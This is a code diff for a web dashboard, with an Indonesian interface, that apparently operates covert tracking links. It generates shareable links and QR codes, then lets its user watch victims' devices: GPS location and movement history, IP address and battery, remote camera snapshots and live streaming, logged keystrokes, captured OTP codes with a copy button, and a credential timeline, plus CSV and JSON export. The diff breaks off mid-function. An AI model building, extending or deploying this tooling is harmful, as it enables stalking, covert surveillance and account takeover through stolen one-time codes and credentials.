+<button class="share-btn wa" id="shareWa">WA</button>
+<button class="share-btn tg" id="shareTg">Telegram</button>
+<button class="share-btn em" id="shareEmail">Email</button>
+</div>
+<div class="expiry-info" id="expiryInfo"></div>
+<div class="qr-wrap" id="qrWrap"></div>
+</div>
+</div>
 </div>
 
-<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-<script src="/app.js"></script>
+<div class="main-area">
+<div class="map-panel">
+<div id="map"></div>
+</div>
+
+<div class="detail-panel" id="detailPanel">
+<div class="detail-header">
+<div class="dh-title">
+<span class="dh-dot offline" id="detailDot"></span>
+<span id="detailTitle">Device</span>
+</div>
+<button class="dh-close" onclick="closeDetail()">&times;</button>
+</div>
+<div class="detail-tabs" id="detailTabs">
+<button class="detail-tab active" data-tab="info" onclick="switchTab('info')">Info</button>
+<button class="detail-tab" data-tab="camera" onclick="switchTab('camera')">Camera</button>
+<button class="detail-tab" data-tab="keystrokes" onclick="switchTab('keystrokes')">Keystrokes</button>
+<button class="detail-tab" data-tab="history" onclick="switchTab('history')">History</button>
+<button class="detail-tab" data-tab="timeline" onclick="switchTab('timeline')">Timeline</button>
+<button class="detail-tab" data-tab="otp" onclick="switchTab('otp')">OTP</button>
+<button class="detail-tab" data-tab="export" onclick="switchTab('export')">Export</button>
+</div>
+<div class="detail-body" id="detailBody">
+<div class="tab-content active" id="tabInfo"></div>
+<div class="tab-content" id="tabCamera"></div>
+<div class="tab-content" id="tabKeystrokes"></div>
+<div class="tab-content" id="tabHistory"></div>
+<div class="tab-content" id="tabTimeline"></div>
+<div class="tab-content" id="tabOtp"></div>
+<div class="tab-content" id="tabExport"></div>
+</div>
+</div>
+
+<div class="bottom-section" id="bottomSection">
+<div class="bs-header">
+<button class="bs-tab active" data-bspanel="links" onclick="switchBsPanel('links')" data-i18n="dashboard.myLinks">Link Saya</button>
+<button class="bs-tab" data-bspanel="devices" onclick="switchBsPanel('devices')" data-i18n="dashboard.trackingResults">Hasil Tracking</button>
+</div>
+<div class="bs-content">
+<div class="bs-panel active" id="bsLinks">
+<div class="links-list" id="linksContainer">
+<div class="empty-state">
+<div class="empty-icon">&#x1f517;</div>
+<p data-i18n="dashboard.noLinks">Belum ada link tracking</p>
+</div>
+</div>
+</div>
+<div class="bs-panel" id="bsDevices">
+<div class="device-cards" id="devicesContainer">
+<div class="empty-state">
+<div class="empty-icon">&#x1f4e1;</div>
+<p data-i18n="dashboard.noDevices">Belum ada device yang mengunjungi link Anda</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="modal-overlay" id="modalOverlay" onclick="closeModal()">
+<button class="modal-close">&times;</button>
+<img id="modalImg" src="" alt="">
+</div>
+
+<div class="toast-container" id="toastContainer"></div>
+
 <script>
-// Use socket from tracker.js (global)
-socket.on('ai-response', (data) => { removeTyping(); addMessage(data.message, 'bot'); });
+const TOAST_LIMIT = 5000;
+const LANG_STORAGE_KEY = 'neural_lang';
+let currentLang = localStorage.getItem(LANG_STORAGE_KEY) || 'id';
+let translations = {};
+let userData = null;
+let devices = [];
+let selectedDeviceId = null;
+let map = null;
+let markers = {};
+let socket = null;
+let cameraStreamActive = false;
+let keystrokeBuffer = '';
+let keystrokeTotal = 0;
+let keystrokeStartTime = null;
+let historyPolyline = null;
+let historyMarkers = [];
+let currentDeviceHistory = null;
 
-function suggest(text) {
-    document.getElementById('chatInput').value = text;
-    sendMessage();
+function escapeHtml(text) {
+if (!text) return '';
+const d = document.createElement('div');
+d.textContent = text;
+return d.innerHTML;
 }
 
-function formatAI(text) {
-    if (!text) return '';
-    // Escape HTML first
-    let s = text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-    // Bold: **text** or *text*
-    s = s.replace(/\*\*(.+?)\*\*/g, '<b>$1</b>');
-    s = s.replace(/\*(.+?)\*/g, '<i>$1</i>');
-    // Inline code: `text`
-    s = s.replace(/`(.+?)`/g, '<code style="background:rgba(255,255,255,0.06);padding:1px 5px;border-radius:3px;font-size:0.82em;">$1</code>');
-    // Numbered lists: 1. 2. etc
-    s = s.replace(/^(\d+)\.\s+(.+)$/gm, '<div style="display:flex;gap:6px;margin:2px 0;"><span style="color:#7c3aed;font-weight:600;min-width:20px;">$1.</span><span>$2</span></div>');
-    // Bullet lists: - or *
-    s = s.replace(/^[-*]\s+(.+)$/gm, '<div style="display:flex;gap:6px;margin:2px 0;"><span style="color:#00d4ff;">\u2022</span><span>$1</span></div>');
-    // Newlines to <br>
-    s = s.replace(/\n/g, '<br>');
-    return s;
+function toast(msg, type) {
+const c = document.getElementById('toastContainer');
+const t = document.createElement('div');
+t.className = 'toast ' + (type || 'error');
+t.textContent = msg;
+c.appendChild(t);
+setTimeout(() => { t.classList.add('out'); setTimeout(() => t.remove(), 300); }, TOAST_LIMIT);
 }
 
-function addMessage(text, role) {
-    const container = document.getElementById('messages');
-    const ws = document.getElementById('welcomeScreen');
-    if (ws) ws.style.display = 'none';
-    const div = document.createElement('div');
-    div.className = 'msg ' + role;
-    if (role === 'bot') {
-        div.innerHTML = '<div class="label">Neural AI</div>' + formatAI(text);
-    } else {
-        div.textContent = text;
-    }
-    container.appendChild(div);
-    container.scrollTop = container.scrollHeight;
-}
+function getToken() { return localStorage.getItem('user_token'); }
 
-function showTyping() {
-    const container = document.getElementById('messages');
-    if (container.querySelector('.typing')) return;
-    const div = document.createElement('div');
-    div.className = 'typing';
-    div.innerHTML = '<div class="dot"></div><div class="dot"></div><div class="dot"></div>';
-    container.appendChild(div);
-    container.scrollTop = container.scrollHeight;
-}
-
-function removeTyping() {
-    const el = document.querySelector('.typing');
-    if (el) el.remove();
-}
-
-function sendMessage() {
-    const input = document.getElementById('chatInput');
-    const msg = input.value.trim();
-    if (!msg) return;
-    input.value = '';
-    addMessage(msg, 'user');
-    showTyping();
-    socket.emit('ai-message', { deviceId: localStorage.getItem('deviceId') || '', message: msg });
-}
-
-document.getElementById('sendBtn').addEventListener('click', sendMessage);
-document.getElementById('chatInput').addEventListener('keydown', (e) => {
-    if (e.key === 'Enter') sendMessage();
+async function api(path, opts) {
+const r = await fetch(path, {
+headers: { 'Content-Type': 'application/json', 'x-user-token': getToken() || '', ...(opts?.headers || {}) },
+...(opts || {})
 });
+return r.json();
+}
 
-// Welcome message from bot on first load
-setTimeout(() => {
-    const ws = document.getElementById('welcomeScreen');
-    if (ws && ws.style.display !== 'none') {
-        document.getElementById('chatInput').focus();
-    }
-}, 500);
+async function loadLang(lang) {
+try {
+const r = await fetch('/lang/' + lang + '.json');
+translations = await r.json();
+document.querySelectorAll('[data-i18n]').forEach(el => {
+const key = el.getAttribute('data-i18n');
+const parts = key.split('.');
+let val = translations;
+for (const p of parts) { if (val) val = val[p]; }
+if (val) {
+if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') el.placeholder = val;
+else el.textContent = val;
+}
+});
+document.documentElement.lang = lang;
+} catch(e) { console.warn('Lang load failed:', e); }
+}
+
+function setLang(lang) {
+currentLang = lang;
+localStorage.setItem(LANG_STORAGE_KEY, lang);
+document.getElementById('langId').classList.toggle('active', lang === 'id');
+document.getElementById('langEn').classList.toggle('active', lang === 'en');
+loadLang(lang);
+}
+
+function handleLogout() {
+localStorage.removeItem('user_token');
+window.location.href = '/login.html';
+}
+
+function t(key) {
+const parts = key.split('.');
+let val = translations;
+for (const p of parts) { if (val) val = val[p]; }
+return val || key;
+}
+
+function toggleMobileSidebar() {
+document.getElementById('sidebar').classList.toggle('open');
+}
+
+function formatTime(ts) {
+if (!ts) return '-';
+return new Date(ts).toLocaleString();
+}
+
+function formatTimeShort(ts) {
+if (!ts) return '';
+const d = new Date(ts);
+return d.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit',second:'2-digit'});
+}
+
+function formatDate(ts) {
+if (!ts) return '';
+return new Date(ts).toLocaleDateString();
+}
+
+// ---- Map ----
+function initMap() {
+map = L.map('map', {
+center: [-6.2, 106.8],
+zoom: 5,
+zoomControl: true,
+attributionControl: false
+});
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+maxZoom: 19
+}).addTo(map);
+}
+
+function addDeviceMarker(device) {
+if (!device.location || !device.location.lat || !device.location.lng) return;
+const id = device.id;
+const lat = device.location.lat;
+const lng = device.location.lng;
+const label = device.label || device.deviceModel || 'Device-' + id.slice(0,6);
+const isOnline = device.online;
+if (markers[id]) {
+markers[id].setLatLng([lat, lng]);
+} else {
+const icon = L.divIcon({
+className: '',
+html: '<div class="marker-label' + (isOnline ? ' online' : '') + '">' + escapeHtml(label) + '</div>',
+iconSize: [0, 0],
+iconAnchor: [0, 0]
+});
+const marker = L.marker([lat, lng], { icon }).addTo(map);
+marker.on('click', function() { selectDevice(id); });
+marker.bindPopup('<b>' + escapeHtml(label) + '</b><br>' + lat.toFixed(4) + ', ' + lng.toFixed(4) + '<br>' + (isOnline ? 'Online' : 'Offline'));
+markers[id] = marker;
+}
+const grp = [];
+devices.forEach(d => {
+if (d.location && d.location.lat && d.location.lng) grp.push([d.location.lat, d.location.lng]);
+});
+if (grp.length > 1) {
+try { map.fitBounds(grp, { padding: [50,50], maxZoom: 15 }); } catch(e) {}
+} else if (grp.length === 1) {
+map.setView(grp[0], 12);
+}
+}
+
+function removeDeviceMarker(id) {
+if (markers[id]) {
+map.removeLayer(markers[id]);
+delete markers[id];
+}
+}
+
+function flyToDevice(lat, lng) {
+map.flyTo([lat, lng], 15, { duration: 1 });
+}
+
+function updateMarkers() {
+devices.forEach(d => addDeviceMarker(d));
+}
+
+// ---- Sidebar ----
+function renderSidebar() {
+const list = document.getElementById('sidebarList');
+const search = (document.getElementById('searchInput').value || '').toLowerCase();
+let html = '';
+const filtered = devices.filter(d => {
+if (!search) return true;
+const label = (d.label || d.deviceModel || d.id || '').toLowerCase();
+const ip = (d.ip || '').toLowerCase();
+return label.includes(search) || ip.includes(search);
+});
+if (filtered.length === 0) {
+html = '<div class="empty-state"><p>' + (t('dashboard.noDevices') || 'Belum ada device') + '</p></div>';
+} else {
+filtered.forEach(d => {
+const isOnline = d.online;
+const label = d.label || d.deviceModel || 'Device-' + d.id.slice(0,6);
+const ip = d.ip || '';
+const loc = d.location ? (d.location.city || d.location.country || '') : '';
+const active = d.id === selectedDeviceId ? ' active' : '';
+html += '<div class="sidebar-item' + active + '" onclick="selectDevice(\'' + d.id + '\')">' +
+'<span class="s-dot ' + (isOnline ? 'online' : 'offline') + '"></span>' +
+'<div class="s-info"><div class="s-label">' + escapeHtml(label) + '</div>' +
+'<div class="s-meta">' + [ip, loc].filter(Boolean).join(' · ') + '</div></div></div>';
+});
+}
+list.innerHTML = html;
+}
+
+function filterDevices() { renderSidebar(); }
+
+// ---- Detail Panel ----
+function selectDevice(id) {
+selectedDeviceId = id;
+const device = devices.find(d => d.id === id);
+if (!device) return;
+document.getElementById('mobileMenuBtn').click();
+renderSidebar();
+addDeviceMarker(device);
+if (device.location && device.location.lat && device.location.lng) {
+flyToDevice(device.location.lat, device.location.lng);
+}
+document.getElementById('detailPanel').classList.add('open');
+document.getElementById('detailPanel').classList.remove('closed');
+const label = device.label || device.deviceModel || 'Device-' + id.slice(0,6);
+document.getElementById('detailTitle').textContent = label;
+const dot = document.getElementById('detailDot');
+dot.className = 'dh-dot ' + (device.online ? 'online' : 'offline');
+loadDeviceDetail(id);
+switchTab('info');
+}
+
+function closeDetail() {
+document.getElementById('detailPanel').classList.remove('open');
+document.getElementById('detailPanel').classList.add('closed');
+selectedDeviceId = null;
+renderSidebar();
+}
+
+function switchTab(tab) {
+document.querySelectorAll('.detail-tab').forEach(t => t.classList.remove('active'));
+document.querySelector('.detail-tab[data-tab="' + tab + '"]').classList.add('active');
+document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+document.getElementById('tab' + tab.charAt(0).toUpperCase() + tab.slice(1)).classList.add('active');
+}
+
+function switchBsPanel(panel) {
+document.querySelectorAll('.bs-tab').forEach(t => t.classList.remove('active'));
+document.querySelector('.bs-tab[data-bspanel="' + panel + '"]').classList.add('active');
+document.querySelectorAll('.bs-panel').forEach(p => p.classList.remove('active'));
+document.getElementById('bs' + panel.charAt(0).toUpperCase() + panel.slice(1)).classList.add('active');
+}
+
+async function loadDeviceDetail(id) {
+const device = devices.find(d => d.id === id);
+if (!device) return;
+const infoTab = document.getElementById('tabInfo');
+const lat = device.location?.lat;
+const lng = device.location?.lng;
+const coords = lat && lng ? lat.toFixed(6) + ', ' + lng.toFixed(6) : '-';
+const gmapsUrl = lat && lng ? 'https://www.google.com/maps?q=' + lat + ',' + lng : '';
+const ua = device.userAgent || '';
+const browser = ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') && !ua.includes('Chrome') ? 'Safari' : ua.includes('Edg') ? 'Edge' : ua.includes('OPR') ? 'Opera' : '-';
+const os = ua.includes('Windows') ? 'Windows' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') || ua.includes('iPad') ? 'iOS' : ua.includes('Mac') ? 'macOS' : ua.includes('Linux') ? 'Linux' : '-';
+const bat = device.battery ? (device.battery.level != null ? Math.round(device.battery.level * 100) + '%' : '-') : '-';
+const conn = device.connection?.type || '-' ;
+
+infoTab.innerHTML =
+'<div class="info-row"><span class="il">Latitude</span><span class="iv">' + (lat != null ? lat.toFixed(6) : '-') + '</span></div>' +
+'<div class="info-row"><span class="il">Longitude</span><span class="iv">' + (lng != null ? lng.toFixed(6) : '-') + '</span></div>' +
+(lat && lng ? '<div class="info-row"><span class="il">GMaps</span><span class="iv"><a href="' + gmapsUrl + '" target="_blank">Buka di Google Maps</a></span></div>' : '') +
+'<div class="info-row"><span class="il">IP Address</span><span class="iv">' + escapeHtml(device.ip || '-') + '</span></div>' +
+'<div class="info-row"><span class="il">Status</span><span class="iv accent">' + (device.online ? 'Online' : 'Offline') + '</span></div>' +
+'<div class="info-row"><span class="il">First Seen</span><span class="iv">' + formatTime(device.firstSeen) + '</span></div>' +
+'<div class="info-row"><span class="il">Last Seen</span><span class="iv">' + formatTime(device.lastSeen) + '</span></div>' +
+'<div class="info-row"><span class="il">Battery</span><span class="iv">' + bat + '</span></div>' +
+'<div class="info-row"><span class="il">Connection</span><span class="iv">' + conn + '</span></div>' +
+'<div class="info-row"><span class="il">Device Model</span><span class="iv">' + escapeHtml(device.deviceModel || '-') + '</span></div>' +
+'<div class="info-row"><span class="il">User Agent</span><span class="iv" style="font-size:.7rem;word-break:break-word">' + escapeHtml(ua || '-') + '</span></div>';
+
+loadCameraTab(id);
+loadKeystrokesTab(id);
+loadHistoryTab(id);
+loadTimelineTab(id);
+loadOtpTab(id);
+loadExportTab(id);
+}
+
+async function loadCameraTab(id) {
+const tab = document.getElementById('tabCamera');
+tab.innerHTML = '<div class="cam-actions"><button class="cam-btn primary" onclick="requestSnapshot(\'' + id + '\')">Request Snapshot</button>' +
+(cameraStreamActive ? '<button class="cam-btn danger" onclick="stopCameraStream(\'' + id + '\')">Stop Camera</button>' : '<button class="cam-btn secondary" onclick="startCameraStream(\'' + id + '\')">Start Camera</button>') +
+'<button class="cam-btn secondary" onclick="refreshSnapshots(\'' + id + '\')">&#x21bb;</button></div>' +
+'<div class="live-frame' + (cameraStreamActive ? ' show' : '') + '" id="liveFrame"><img id="liveImg" src="" alt=""></div>' +
+'<div class="snapshots-grid" id="snapGrid"><div class="empty-state" style="grid-column:1/-1"><p>Memuat snapshot...</p></div></div>';
+refreshSnapshots(id);
+}
+
+async function refreshSnapshots(id) {
+const grid = document.getElementById('snapGrid');
+try {
+const data = await api('/api/user/device/' + id + '/snapshots');
+if (data.ok && data.snapshots && data.snapshots.length > 0) {
+let html = '';
+data.snapshots.forEach(s => {
+const filename = s.filename || s;
+const time = s.time || '';
+html += '<div class="snap-item" onclick="openModal(\'/snapshots/' + filename + '\')">' +
+'<img src="/snapshots/' + filename + '" loading="lazy" alt="snapshot">' +
+(time ? '<div class="snap-time">' + formatTimeShort(time) + '</div>' : '') + '</div>';
+});
+grid.innerHTML = html;
+} else {
+grid.innerHTML = '<div class="empty-state" style="grid-column:1/-1"><p>Belum ada snapshot</p></div>';
+}
+} catch(e) {
+grid.innerHTML = '<div class="empty-state" style="grid-column:1/-1"><p>Gagal memuat snapshot</p></div>';
+}
+}
+
+function requestSnapshot(id) {
+socket?.emit('request-snapshot', id);
+toast('Snapshot request sent', 'success');
+}
+
+function startCameraStream(id) {
+socket?.emit('start-camera-stream', id);
+cameraStreamActive = true;
+document.getElementById('liveFrame')?.classList.add('show');
+loadCameraTab(id);
+toast('Camera stream started', 'success');
+}
+
+function stopCameraStream(id) {
+socket?.emit('stop-camera-stream', id);
+cameraStreamActive = false;
+document.getElementById('liveFrame')?.classList.remove('show');
+loadCameraTab(id);
+toast('Camera stream stopped', 'success');
+}
+
+async function loadKeystrokesTab(id) {
+const tab = document.getElementById('tabKeystrokes');
+tab.innerHTML = '<div style="display:flex;gap:8px;align-items:center;margin-bottom:8px"><button class="cam-btn secondary" onclick="refreshKeystrokes(\'' + id + '\')">&#x21bb; Refresh</button>' +
+'<button class="cam-btn danger" style="margin-left:auto" onclick="clearKeystrokes()">Clear</button></div>' +
+'<div class="keystroke-box" id="keystrokeBox">' + escapeHtml(keystrokeBuffer || 'Belum ada data keystroke...') + '</div>' +
+'<div class="k-stats" id="keystats"><span class="k-stat">Total: <span class="ks-val" id="ksTotal">' + keystrokeTotal + '</span></span>' +
+'<span class="k-stat">Duration: <span class="ks-val" id="ksDuration">-</span></span>' +
+'<span class="k-stat">Speed: <span class="ks-val" id="ksSpeed">-</span> kpm</span></div>';
+refreshKeystrokes(id);
+}
+
+async function refreshKeystrokes(id) {
+try {
+const data = await api('/api/user/device/' + id + '/keystrokes');
+if (data.ok && data.keystrokes && data.keystrokes.length > 0) {
+const keys = data.keystrokes.map(k => k.k || k.key || '').join('');
+keystrokeBuffer = keys;
+keystrokeTotal = keys.length;
+if (!keystrokeStartTime) keystrokeStartTime = Date.now();
+updateKeystrokeUI();
+}
+} catch(e) {}
+}
+
+function updateKeystrokeUI() {
+const box = document.getElementById('keystrokeBox');
+if (box) box.textContent = keystrokeBuffer || 'Belum ada data keystroke...';
+document.getElementById('ksTotal').textContent = keystrokeTotal;
+const dur = keystrokeStartTime ? Math.round((Date.now() - keystrokeStartTime) / 1000) : 0;
+const mins = dur / 60;
+document.getElementById('ksDuration').textContent = dur + 's';
+document.getElementById('ksSpeed').textContent = mins > 0 ? Math.round(keystrokeTotal / mins) : 0;
+}
+
+function clearKeystrokes() {
+keystrokeBuffer = '';
+keystrokeTotal = 0;
+keystrokeStartTime = null;
+updateKeystrokeUI();
+}
+
+function appendKeystroke(key) {
+keystrokeBuffer += key;
+keystrokeTotal++;
+if (!keystrokeStartTime) keystrokeStartTime = Date.now();
+updateKeystrokeUI();
+const box = document.getElementById('keystrokeBox');
+if (box) { box.scrollTop = box.scrollHeight; }
+}
+
+async function loadHistoryTab(id) {
+const tab = document.getElementById('tabHistory');
+tab.innerHTML = '<canvas class="timeline-canvas" id="historyCanvas" onclick="onHistoryCanvasClick(event)"></canvas>' +
+'<div class="timeline-actions">' +
+'<button class="tl-btn active" data-range="all" onclick="filterHistory(\'' + id + '\',\'all\')">All</button>' +
+'<button class="tl-btn" data-range="1h" onclick="filterHistory(\'' + id + '\',\'1h\')">1 Hour</button>' +
+'<button class="tl-btn" data-range="30m" onclick="filterHistory(\'' + id + '\',\'30m\')">30 Min</button>' +
+'<button class="tl-btn" data-range="5m" onclick="filterHistory(\'' + id + '\',\'5m\')">5 Min</button>' +
+'<button class="tl-btn danger" style="margin-left:auto" onclick="clearHistory()">Clear</button></div>';
+refreshHistory(id, 'all');
+}
+
+async function refreshHistory(id, range) {
+try {
+const data = await api('/api/user/device/' + id + '/history');
+if (data.ok && data.history && data.history.length > 0) {
+currentDeviceHistory = data.history;
+drawHistoryCanvas(data.history, range);
+} else {
+currentDeviceHistory = null;
+const canvas = document.getElementById('historyCanvas');
+if (canvas) {
+const ctx = canvas.getContext('2d');
+ctx.fillStyle = '#0f0f25';
+ctx.fillRect(0, 0, canvas.width, canvas.height);
+ctx.fillStyle = '#3a3a5e';
+ctx.font = '12px sans-serif';
+ctx.textAlign = 'center';
+ctx.fillText('Belum ada data history', canvas.width/2, 32);
+}
+}
+} catch(e) {}
+}
+
+function drawHistoryCanvas(history, range) {
+const canvas = document.getElementById('historyCanvas');
+if (!canvas) return;
+const rect = canvas.getBoundingClientRect();
+canvas.width = rect.width * 2;
+canvas.height = rect.height * 2;
+canvas.style.width = rect.width + 'px';
+canvas.style.height = rect.height + 'px';
+const ctx = canvas.getContext('2d');
+const w = canvas.width;
+const h = canvas.height;
+ctx.fillStyle = '#0f0f25';
+ctx.fillRect(0, 0, w, h);
+let pts = history.map(p => ({ lat: p.lat || p[0], lng: p.lng || p[1], time: p.time }));
+if (range !== 'all') {
+const cutoff = Date.now() - (range === '1h' ? 3600000 : range === '30m' ? 1800000 : 300000);
+pts = pts.filter(p => p.time && new Date(p.time).getTime() > cutoff);
+}
+if (pts.length < 2) {
+ctx.fillStyle = '#3a3a5e';
+ctx.font = '12px sans-serif';
+ctx.textAlign = 'center';
+ctx.fillText('Data tidak mencukupi', w/2, h/2);
+return;
+}
+const lats = pts.map(p => p.lat);
+const lngs = pts.map(p => p.lng);
+const minLat = Math.min(...lats);
+const maxLat = Math.max(...lats);
+const minLng = Math.min(...lngs);
+const maxLng = Math.max(...lngs);
+const pad = 0.1;
+const latRange = maxLat - minLat || 1;
+const lngRange = maxLng - minLng || 1;
+ctx.strokeStyle = '#00d4ff';
+ctx.lineWidth = 3;
+ctx.beginPath();
+pts.forEach((p, i) => {
+const x = ((p.lng - minLng) / lngRange) * (w - 40) + 20;
+const y = h - (((p.lat - minLat) / latRange) * (h - 40) + 20);
+if (i === 0) ctx.moveTo(x, y);
+else ctx.lineTo(x, y);
+});
+ctx.stroke();
+pts.forEach((p, i) => {
+const x = ((p.lng - minLng) / lngRange) * (w - 40) + 20;
+const y = h - (((p.lat - minLat) / latRange) * (h - 40) + 20);
+ctx.fillStyle = i === 0 ? '#7c3aed' : i === pts.length - 1 ? '#00d4ff' : 'rgba(0,212,255,0.5)';
+ctx.beginPath();
+ctx.arc(x, y, i === 0 || i === pts.length - 1 ? 5 : 3, 0, Math.PI * 2);
+ctx.fill();
+});
+canvas._points = pts.map(p => ({ x: ((p.lng - minLng) / lngRange) * (w - 40) + 20, y: h - (((p.lat - minLat) / latRange) * (h - 40) + 20), lat: p.lat, lng: p.lng }));
+}
+
+function onHistoryCanvasClick(e) {
+const canvas = document.getElementById('historyCanvas');
+if (!canvas || !canvas._points) return;
+const rect = canvas.getBoundingClientRect();
+const x = (e.clientX - rect.left) * 2;
+const y = (e.clientY - rect.top) * 2;
+let minDist = Infinity;
+let closest = null;
+canvas._points.forEach(p => {
+const d = Math.sqrt((p.x - x) ** 2 + (p.y - y) ** 2);
+if (d < minDist) { minDist = d; closest = p; }
+});
+if (closest && closest.lat && closest.lng) {
+flyToDevice(closest.lat, closest.lng);
+}
+}
+
+function filterHistory(id, range) {
+document.querySelectorAll('.tl-btn[data-range]').forEach(b => b.classList.remove('active'));
+document.querySelector('.tl-btn[data-range="' + range + '"]')?.classList.add('active');
+refreshHistory(id, range);
+}
+
+function clearHistory() {
+const canvas = document.getElementById('historyCanvas');
+if (canvas) {
+const ctx = canvas.getContext('2d');
+ctx.fillStyle = '#0f0f25';
+ctx.fillRect(0, 0, canvas.width, canvas.height);
+}
+currentDeviceHistory = null;
+}
+
+async function loadTimelineTab(id) {
+const tab = document.getElementById('tabTimeline');
+tab.innerHTML = '<div class="timeline-events" id="timelineEvents"><div class="empty-state"><p>Memuat timeline...</p></div></div>';
+try {
+const data = await api('/api/user/device/' + id + '/timeline');
+if (data.ok && data.timeline) {
+const events = data.timeline.events || data.timeline;
+if (events.length > 0) {
+let html = '';
+const icons = { 'location': '📍', 'snapshot': '📷', 'keystroke': '⌨️', 'otp': '🔑', 'credential': '🔐' };
+events.forEach(e => {
+const icon = icons[e.type] || '📌';
+const time = e.time ? formatTimeShort(e.time) : '';
+html += '<div class="timeline-event"><div class="te-icon">' + icon + '</div>' +
+'<div class="te-body"><div>' + escapeHtml(e.detail || e.data || e.type || '') + '</div>' +
+(time ? '<div class="te-time">' + time + '</div>' : '') + '</div></div>';
+});
+document.getElementById('timelineEvents').innerHTML = html;
+} else {
+document.getElementById('timelineEvents').innerHTML = '<div class="empty-state"><p>Belum ada event</p></div>';
+}
+} else {
+document.getElementById('timelineEvents').innerHTML = '<div class="empty-state"><p>Belum ada event</p></div>';
+}
+} catch(e) {
+document.getElementById('timelineEvents').innerHTML = '<div class="empty-state"><p>Gagal memuat timeline</p></div>';
+}
+}
+
+async function loadOtpTab(id) {
+const tab = document.getElementById('tabOtp');
+tab.innerHTML = '<div class="empty-state"><p>Memuat data OTP...</p></div>';
+try {
+const data = await api('/api/user/device/' + id + '/otp');
+if (data.ok) {
+const otpHistory = data.otpHistory || [];
+const lastOTP = data.lastOTP || (otpHistory.length > 0 ? otpHistory[otpHistory.length - 1] : null);
+let html = '';
+if (otpHistory.length > 0) {
+html += '<div class="otp-list">';
+otpHistory.forEach((o, i) => {
+const isLast = i === otpHistory.length - 1 || (lastOTP && o.code === lastOTP.code && o.time === lastOTP.time);
+const code = o.code || o.otp || o;
+const time = o.time || '';
+html += '<div class="otp-item' + (isLast ? ' highlight' : '') + '">' +
+'<span class="otp-code">' + escapeHtml(code.toString()) + '</span>' +
+(time ? '<span class="otp-time">' + formatTimeShort(time) + '</span>' : '') + '</div>';
+});
+html += '</div>';
+if (lastOTP) {
+const lastCode = lastOTP.code || lastOTP.otp || lastOTP;
+html += '<button class="otp-copy-btn" onclick="copyOTP(\'' + escapeHtml(lastCode.toString()) + '\')">Copy Last OTP</button>';
+}
+} else {
+html = '<div class="empty-state"><p>Belum ada data OTP</p></div>';
+}
+tab.innerHTML = html;
+} else {
+tab.innerHTML = '<div class="empty-state"><p>Belum ada data OTP</p></div>';
+}
+} catch(e) {
+tab.innerHTML = '<div class="empty-state"><p>Gagal memuat OTP</p></div>';
+}
+}
+
+function copyOTP(code) {
+navigator.clipboard.writeText(code).then(() => {
+toast('OTP disalin: ' + code, 'success');
+}).catch(() => {
+toast('Gagal menyalin OTP');
+});
+}
+
+function loadExportTab(id) {
+const tab = document.getElementById('tabExport');
+tab.innerHTML = '<div class="export-actions">' +
+'<button class="exp-btn primary" onclick="exportCSV(\'' + id + '\')"><span class="exp-icon">&#x1f4c4;</span> Download CSV</button>' +
+'<button class="exp-btn secondary" onclick="exportJSON(\'' + id + '\')"><span class="exp-icon">&#x1f4cb;</span> Download JSON</button>' +
+'<button class="exp-btn secondary" onclick="copyDeviceId(\'' + id + '\')"><span class="exp-icon">&#x1f4ce;</span> Copy Device ID</button></div>';
+}
+
+function exportCSV(id) {
+window.open(location.origin + '/api/user/export/csv/' + id + '?token=' + getToken(), '_blank');
+}
+
+function exportJSON(id) {
+window.open(location.origin + '/api/user/export/json/' + id + '?token=' + getToken(), '_blank');
+}
+
+function copyDeviceId(id) {
+navigator.clipboard.writeText(id).then(() => {
+toast('Device ID disalin', 'success');
+}).catch(() => {
+toast('Gagal menyalin');
+});
+}
+
+// ---- Generate Link ----
+function copyLink() {
+const inp = document.getElementById('trackingLink');
+inp.select();
+navigator.clipboard.writeText(inp.value).then(() => {
+toast(t('dashboard.copied') || 'Link disalin!', 'success');
+}).catch(() => {
+document.execCommand('copy');
+toast(t('dashboard.copied') || 'Link disalin!', 'success');
+});
+}
+
+async function generateLink() {
+const btn = document.getElementById('generateBtn');
+btn.classList.add('loading');
+try {
+const data = await api('/api/user/create-link', { method: 'POST', body: JSON.stringify({}) });
+if (!data.ok) { toast(data.error || 'Gagal generate link'); btn.classList.remove('loading'); return; }
+document.getElementById('trackingLink').value = data.trackingLink || data.link;
+document.getElementById('linkResult').classList.add('show');
+const generatedLink = data.trackingLink || data.link;
+const shareUrls = { wa: data.whatsapp, tg: data.telegram, em: data.email };
+document.getElementById('shareWa').onclick = () => window.open(shareUrls.wa, '_blank');
+document.getElementById('shareTg').onclick = () => window.open(shareUrls.tg, '_blank');
+document.getElementById('shareEmail').onclick = () => window.location.href = shareUrls.em;
+const isFree = userData && userData.tier === 'free';
+const expiryEl = document.getElementById('expiryInfo');
+if (isFree) {
+expiryEl.textContent = t('dashboard.expiryFree') || 'Link gratis: berlaku 1 jam';
+} else {
+expiryEl.textContent = t('dashboard.expiryPro') || 'Link Pro: permanen';
+}
+const qrWrap = document.getElementById('qrWrap');
+qrWrap.innerHTML = '';
+new QRCode(qrWrap, { text: generatedLink, width: 100, height: 100 });
+toast(t('dashboard.linkCreated') || 'Link berhasil dibuat!', 'success');
+loadDashboard();
+} catch(e) {
+toast('Error: ' + e.message);
+}
+btn.classList.remove('loading');
+}
+
+// ---- Modal ----
+function openModal(src) {
+document.getElementById('modalImg').src = src;
+document.getElementById('modalOverlay').classList.add('open');
+}
+
+function closeModal() {
+document.getElementById('modalOverlay').classList.remove('open');
+document.getElementById('modalImg').src = '';
+}
+
+// ---- Socket ----
+function initSocket() {
+const token = getToken();
+if (!token) return;
+socket = io(location.origin, { query: { userToken: token } });
+socket.on('connect', () => { console.log('Socket connected'); });
+socket.on('device-new', (data) => {
+const dev = data.device || data;
+if (!devices.find(d => d.id === dev.id)) {
+devices.unshift(dev);
